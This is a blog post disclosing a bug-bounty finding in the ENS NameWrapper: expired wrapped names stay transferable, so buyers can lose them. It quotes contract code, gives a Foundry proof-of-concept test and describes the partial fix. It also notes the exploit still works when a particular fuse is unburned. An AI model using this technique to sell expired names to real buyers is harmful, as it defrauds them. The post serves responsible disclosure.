---
layout: post
title:  "Bounty: ENS NameWrapper expiry issue"
date:   2022-12-24 20:28:22 -0400
categories: web3
---

![image](/assets/img/paradise.jpeg)

##### Quick Links 
[About ENS and ENS Subdomains](#about-ens-and-ens-subdomains)  
[About the NameWrapper](#about-the-ens-namewrapper)  
[Finding the bug](#finding-the-bug)  
[Proof of Concept](#proof-of-concept)  
[Patch](#patch)  
[Reward](#reward)  


# About ENS and ENS Subdomains
Currently [Ethereum Name Service](https://docs.ens.domains/) or just ENS for short is an ERC721 NFT collection. A user can mint a token that represents something similar to a domain or username where as its a memorable representation of a users wallet address such as a word, phrase, pattern of text, pattern of digits, emojis, almost anything can be registered as a top level ENS name as the only limitation on the contract is that names must be >= 3 characters in length. ENS names also allow the user to store various TEXT records similar to DNS Text records. 

Similar to DNS/Domain names; ENS allows an owner of a name to create "subdomains" of the top level name. ENS subdomains currently at the time of writing are not minted as tradable tokens (ERC721, ERC1155, etc). Meaning that if the owner of coke.eth created drink.coke.eth that name can not be traded to another user by the current "owner" of the subdomain. 

# About the NameWrapper

The [NameWrapper](https://github.com/ensdomains/ens-contracts/tree/master/contracts/wrapper) contracts are an ERC1155 "upgrade" for new or existing ERC721 ENS names. The wrapper allows the owner of an ERC721 ENS name to wrap the name into an ERC1155 token. This wrapping comes with added functionality such that subdomains are now minted similarly to the top level name and become tradable/transferable as an ERC1155 token. Allowing users to generate income from subdomain purchases/rentals etc. 

# Finding the bug

This bug was uncovered while I was implementing subdomain functionality for [ENSVision](https://ens.vision) and comparing the new ERC1155fuse expirations with the way I know the previous ERC721 expirations worked. 

In the current ENS ERC721 token implementation the transaction will revert if the names expiration is > *now*  

To see how that works the three functions that handle token transfers are below.  

```javascript
function safeTransferFrom(address from, address to, uint256 tokenId) public {
    safeTransferFrom(from, to, tokenId, "");
}

function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory _data) public {
    transferFrom(from, to, tokenId);
    require(_checkOnERC721Received(from, to, tokenId, _data));
}

function transferFrom(address from, address to, uint256 tokenId) public {
    require(_isApprovedOrOwner(msg.sender, tokenId));
    _transferFrom(from, to, tokenId);
}
```

You can see that all paths from other functions lead to the _transferFrom() function. Lets take a look below:  

```javascript
function _transferFrom(address from, address to, uint256 tokenId) internal {
    require(ownerOf(tokenId) == from);
    require(to != address(0));

    _clearApproval(tokenId);

    _ownedTokensCount[from] = _ownedTokensCount[from].sub(1);
    _ownedTokensCount[to] = _ownedTokensCount[to].add(1);

    _tokenOwner[tokenId] = to;

    emit Transfer(from, to, tokenId);
}

function ownerOf(uint256 tokenId) public view returns (address) {
    require(expiries[tokenId] > now); // Check if name is expired, revert if expired.
    return super.ownerOf(tokenId);
}
```

When transferFrom or safeTransferFrom is called on a token/name it first calls ownerOf which verifies the tokens expiration is greater than *now* or it will revert per the require statement.   

Knowing this we can keep this in mind while reviewing the ERC1155 nameWrapper contract and compare expiration methodology.  

Check the transfer methods of the ERC1155 namewrapper below. For brevity I wont include the batchTransfer functions.

The code snippets below can be found in this [github repo](https://github.com/ensdomains/ens-contracts/tree/deployment/testnets/contracts/wrapper) 

```javascript
    function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        uint256 amount,
        bytes memory data
    ) public virtual override {
        require(to != address(0), "ERC1155: transfer to the zero address");
        require(
            from == msg.sender || isApprovedForAll(from, msg.sender),
            "ERC1155: caller is not owner nor approved"
        );

        _transfer(from, to, id, amount, data);
    }
```

You can see that the safeTransferFrom call calls the _transfer() function below:  

```javascript
function _transfer(address from, address to, uint256 id, uint256 amount, bytes memory data ) internal {

        (address oldOwner, uint32 fuses, uint64 expiry) = getData(id); // get owner, fuses, expiration of given tokenId

        if (oldOwner == to) {
            return;
        }

        if (!_canTransfer(fuses)) {
            revert OperationProhibited(bytes32(id));
        }

        require(
            amount == 1 && oldOwner == from,
            "ERC1155: insufficient balance for transfer"
        );

        // set owner, fuses, expiration of given tokenId
        // if you recall getData sets the fuses = 0 if now > expiration. 
        _setData(id, to, fuses, expiry);

        emit TransferSingle(msg.sender, from, to, id, amount);

        _doSafeTransferAcceptanceCheck(msg.sender, from, to, id, amount, data);
    }
```
The _transfer() function will call getData() to retrieve info about a specific tokenId such as owner, fuses, expiration instead of the ownerOf() function from the ERC721 token.  

Checking the getData() and setData() functions below will give us all we need to know:  

```javascript
    function getData(uint256 tokenId)
        public
        view
        returns (
            address owner,
            uint32 fuses,
            uint64 expiry
        )
    {
        uint256 t = _tokens[tokenId];
        owner = address(uint160(t));
        expiry = uint64(t >> 192);
        if (block.timestamp > expiry) {
            fuses = 0; // reset fuses to 0 here if expiration > now and return that value as the fuse value.
        } else {
            fuses = uint32(t >> 160);
        }
    }
```

The getData() function will check if the blocktimestamp is > the tokens expiration. If it is then it will simply set the fuses to 0 effectively resetting them to default value and continue execution.

setData() will take the input variables and set the tokenId owner, fuses, expiration with the given parameters. 
Meaning if a wrapped ERC1155 token "expires" the fuses are simply reset to 0 and nothing else.

An astute reader may notice that unlike the ERC721 implementation the ERC1155 implementation has no locking of the token when its expired. Meaning that wrapped ERC1155 tokens can continue to be transferred/sold post-expiration. 

An example would be that the ERC721 john.eth owned by 0xABC is wrapped as an ERC1155 john.eth owned by 0xABC. When the ERC721 john.eth expires and 0xABC no longer owns it and thus can no longer transfer it, they could still transfer/sell the ERC1155 john.eth token until some one remints/buys the ERC721 token then mints a *new* ERC1155 john.eth. The previous ERC1155 john.eth token would finally be burned and any purchaser of that ERC1155 token would be rugged. 

When dealing with any *wrapped* tokens one needs to think of the underlying asset as well as the *new* asset functionality.  

I reported this [bug](https://discuss.ens.domains/t/namewrapper-updates-including-testnet-deployment-addresses/14505/9?u=lcfr.eth) to ENS in October 2022 after the first code4arena audit completed but prior to the deployment to mainnet. 

# Proof of Concept

Below is a foundry script to demonstrate the vulnerability. It will first register an ENS name, wrap the name on the nameWrapper contract and then fastfoward the blocktime to > expiration using the foundry cheatcode warp(). While the names ERC721 token is expired or in grace it can not be transferred or sold. How ever the ERC1155 wrapped token which corresponds to the unwrapped ERC721 name can still be transferred or sold on market places.  

Eventually when the base ERC721 name is re-registered and wrapped the previous ERC1155 token would be burned/rugged from the user who potentially purchased it on secondary. 

```javascript
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface INameWrapper {
function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        uint256 amount,
        bytes memory data
    ) external;
}

interface IETHRegistrarController {
    function available(string memory) external returns (bool);

    function makeCommitment(
        string memory,
        address,
        uint256,
        bytes32,
        address,
        bytes[] calldata,
        bool,
        uint32,
        uint64
    ) external returns (bytes32);

    function commit(bytes32) external;

    function register(
        string calldata,
        address,
        uint256,
        bytes32,
        address,
        bytes[] calldata,
        bool,
        uint32,
        uint64
    ) external payable;

    function renew(string calldata, uint256) external payable;
}

contract ExpireTest is Test {

    address ensReg = address(0x9C51161bA2FB02Cc0a403332B607117685f34831);
    address Wrapper = address(0x582224b8d4534F4749EFA4f22eF7241E0C56D4B8);

    function setUp() public {
    }

    function testExpired1155ETH2LDTransfer() public {

        string memory name = "lcfrWrapped";
        address owner = address(0x328eBc7bb2ca4Bf4216863042a960E3C64Ed4c10);
        uint duration = 31556952;
        bytes32 secret = bytes32(0);
        address resolver = address(0xE264d5bb84bA3b8061ADC38D3D76e6674aB91852);
        bytes[] memory data; 
        bool reverseRecord = false;
        uint32 fuses = 0;
        uint64 wrapperExpiry = 31556952;

        IETHRegistrarController controller = IETHRegistrarController(ensReg);
        INameWrapper nameWrapper = INameWrapper(Wrapper);

        // start executing as lcfr
        vm.startPrank(owner);

        bytes32 commitment = controller.makeCommitment(name, owner, duration, secret, resolver, data, reverseRecord, fuses, wrapperExpiry);
        controller.commit(commitment);
        vm.warp(block.timestamp + 60);
        controller.register{value: 1000000000000000000}(name, owner, duration, secret, resolver, data, reverseRecord, fuses, wrapperExpiry);

        // expired ++ out of grace
        vm.warp(block.timestamp + (duration + duration));
        // transfer expired
        nameWrapper.safeTransferFrom(owner, address(0x9E5916079eD74C38FaA3322bDAec62307beA1D9b), 27949844422937690035200873550242027254593755523825974100076274775564884645311, 1, "");
    }
}
```

# Patch

This issue was fixed by Jeff and Nick from ENS Labs after a few days of reporting.  
[Github Commit](https://github.com/ensdomains/ens-contracts/commit/c16273aa07b2eda1af68c487c91d8cb2414244fc)

![image](/assets/img/namewrapperbounty/patch1.png)  

![image](/assets/img/namewrapperbounty/patch2.PNG)  

You can see the patch adds a function _preTransferCheck() which adds the revert behaviour if the names expiry is < *now* and the name has been "emancipated" aka the PARENT_CANNOT_CONTROL fuse has been burned to prevent the parent/owner from being able to remint/reissue the name.  

Note: The patch still allows the proof of concept exploit to work as in the example the fuses are set to 0 for the name and PARENT_CANNOT_CONTROL is therefor not burned.   

If address 0x123 registers the ERC721 john.eth, then wraps it to an ERC1155 using the nameWrapper and does not burn the PARENT_CANNOT_CONTROL fuse, when the ERC721 john.eth expires the current owner (0x123) of the ERC1155 john.eth token could still sell or transfer the token until it is minted/created again by the new owner of the ERC721 john.eth by wrapping the name.  

<style>
r { color: Red }
</style>

<r>NFT Marketplace recomendation: Dissallow/check every ERC1155 ENS name before listing that the PARENT_CANNOT_CONTROL fuse is burned. This is a stop-gap to prevent expired ERC721's previous ERC1155 counterparts from being used to scam users.</r>  

# Reward
3500 USDC  
200 ENS Tokens
4/29/23 - UPDATE - additional 25k paid